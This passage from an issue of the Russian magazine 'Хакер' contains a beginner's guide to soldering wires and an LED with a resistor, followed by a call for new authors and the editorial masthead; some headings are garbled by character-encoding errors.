можно сточить до нужного диаметра (и формы), если они не подходят, а чис‐
тить железной кухонной губкой. С жалами для паяльников с керамическим
нагревателем все сложнее, их так легко под размер не подгонишь, поэтому
жала брать надо того типоразмера, который  указывает  производитель.
Заметь: на них вообще нельзя воздействовать механически, а очищать можно
только влажной целлюлозной губкой или специальными химическими средс‐
твами.





                                  Жала




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИGEEK
      ВРЕМЯ ПАЯТЬ!

          ПОДБИРАЕМ ИНСТРУМЕНТЫ И ОСВАИВАЕМ
                            ИСКУССТВО ПАЙКИ





ВРЕМЯ ПАЯТЬ!
Итак, разобрались, что нужно для пайки. Начнем наконец паять! Тебе пот‐
ребуются непосредственно паяльник, припой и флюс. О подставке под паяль‐
ник и губке я не говорю, необходимость в них очевидна.


           WARNING

                        Хоть все мы взрослые люди и понимаем опас‐
                        ность ожогов, все равно напоминаю — паяльник
                            раскаляется до очень высокой температуры. Будь
                           аккуратен и не дотрагивайся до металлических
                            частей паяльника, пока он не остынет!



Спаяем два провода
Если будешь собирать какой‑то девайс, тебе не раз придется спаивать два
провода вместе. Приступим к работе.
  Для начала зачисти стриппером кончики проводов от изоляции. Если про‐
вод многожильный (состоит из множества тоненьких проволочек), то скрути
все жилы в косичку, для прочности.





                                 Зачистка проводов

Возьми небольшой кусочек термоусадки и надень его на один из проводов.
Протяни его поглубже, чтобы случайно не задеть паяльником. Термоусадка
понадобится нам позже для изоляции.





                          Термоусадка на проводе

Перед пайкой не забудь про лужение (то есть нанесение припоя) — оно обя‐
зательно! Иначе на проводах будет образовываться оксидная пленка.
   Расскажу о способе, который использую лично я. Сначала наносим кис‐
точкой флюс на зачищенный конец провода. Затем очищаем раскаленное
жало о необгораемую губку (не забудь перед этим хорошенько смочить ее
водой!). После так же, как письменную ручку, берем в руку паяльник (конечно
же, за пластмассовую часть), подносим припой к жалу, он расплавляется,
образуя капельку жидкого металла. Чем меньше провод, который нужно
залудить, тем меньше должна быть капля. Если припоя слишком много, его
можно «снять», обтерев об губку, и взять уже меньше припоя. После под‐
носим припой на жале паяльника к зачищенному концу провода, смазанному
флюсом, и пару секунд удерживаем паяльник — припой быстро растечется
по проводу и надежно скрепит все жилки. То же самое проделаем с другим
проводом.





                                Лужение

Дальше все просто: соедини два залуженных конца проводов между собой
и дотронься до них жалом паяльника с каплей припоя. Немного держишь...
и провода соединились! Как видишь, пайка — это довольно просто.





                                    Пайка

Теперь необходимо изолировать место спайки — установи термоусадку,
насаженную ранее на место спайки (надеюсь, ты про нее не забыл), и нагрей.
Нагревать ее нужно равномерно, делать это можно как паяльным феном, так
и обычной зажигалкой. Через несколько секунд нагревания термоусадка рез‐
ко сузится и надежно изолирует оголенную часть нового провода.





                     Изоляция провода термоусадкой

Провода надежно спаяны, теперь разделить их можно, только откусив кусач‐
ками или распаяв паяльником.


Припаиваем резистор к светодиоду
В одной из своих статей по цифровой электронике я рассказывал, что све‐
тодиод отдельно от резистора к батарейке подключать нельзя — он может
перегореть. Давай  рассмотрим  пайку  «ног»  электронных  компонентов
на этом примере.


             INFO

                          Электронные  компоненты  поставляются с уже
                        залуженными  контактами,  поэтому,  если  ты
                      паяешь   готовые   электронные   компоненты,
                      лужение можно пропустить.





                            Светодиод и резистор

Для начала нанесем флюс на те контакты, которые собираемся паять. Так
как резистор полярности не имеет, выбор ноги не имеет значения. Теперь
просто соединим контакты и нанесем на пересекающуюся часть каплю при‐
поя. Готово!





                    Спаянные светодиод и резистор


ВЫВОДЫ
Надеюсь, прочитав эту статью, ты смог освоить новый полезный навык — пай‐
ку.  Теперь,  если  ты  захочешь  собрать  свое  электронное  устройство
или модифицировать чужое, ты без труда сможешь спаять любые провода
и компоненты.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №06 (279)

            Андрей Письменный        Илья Русанен            Алексей Глазков
               Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                         РЕДАКТОРЫ РУБРИК

            Андрей Письменный         Евгений Зобнин        Валентин Холмогоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
               Татьяна Чупрова            Марк           Иван «aLLy» Андреев
                chuprova@glc.ru       Бруцкий-Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​
08.​2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022